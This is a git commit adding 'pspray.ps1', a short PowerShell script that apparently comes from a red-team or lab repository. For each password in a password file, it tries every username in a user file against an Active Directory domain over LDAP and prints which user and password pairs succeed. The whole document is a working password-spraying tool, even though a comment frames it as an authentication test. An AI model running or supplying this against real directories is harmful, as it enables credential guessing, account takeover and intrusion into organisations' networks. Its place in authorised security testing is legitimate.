53ad155a442df161a113e01b86fe5563f98af0a5
wunderwuzzi23 <35349594+wunderwuzzi23@users.noreply.github.com>
2019-07-04 18:26:06 -0700

    Update pspray.ps1

--- pspray.ps1
+++ pspray.ps1
@@ -1,1 +1,23 @@
+# Simple snippet to loop over a passwords and a user file 
+# to perform an Active Directory Authentication Test
 
+cat .\passwords.txt |
+% {
+     $pwd = $_;
+     cat .\users.txt |
+     % {
+           $user = $_;
+           "Trying $user::$pwd..."
+           
+           if (New-Object System.DirectoryServices.DirectoryEntry("LDAP://homefield/DC=corp,DC=homefield,DC=local",
+                   $user,  
+                   $pwd).name -ne $null)
+           {
+              "Success: $user::$pwd"
+           }
+           else
+           {
+              "Fail: $user::$pwd"
+           } 
+       }
+}
